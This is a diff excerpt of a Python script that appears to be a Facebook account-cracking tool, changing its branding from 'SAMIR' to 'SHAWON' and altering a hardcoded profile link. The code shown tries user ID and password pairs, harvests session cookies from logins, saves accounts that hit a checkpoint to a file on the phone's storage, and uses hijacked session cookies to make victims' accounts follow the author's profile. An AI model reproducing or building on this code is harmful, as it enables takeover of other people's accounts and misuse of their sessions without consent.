@@ -41,7 +41,7 @@ def cek_apk(session,coki):
             print('')
 
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(session.get('https://www.facebook.com/Abal.Not.Allow4685?mibextid=ZbWKwL', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://mbasic.facebook.com' + str(get), {
@@ -250,14 +250,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                #print('[SAMIR-CP] ' +uid+ '|' +ps+ '')
+                #print('[SHAWON-CP] ' +uid+ '|' +ps+ '')
                 open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r \033[1;91m[\033[1;97mSAMIR-KING\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
+        sys.stdout.write('\r \033[1;91m[\033[1;97mSHAWON-KING\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
         sys.stdout.flush()
     except:
         pass
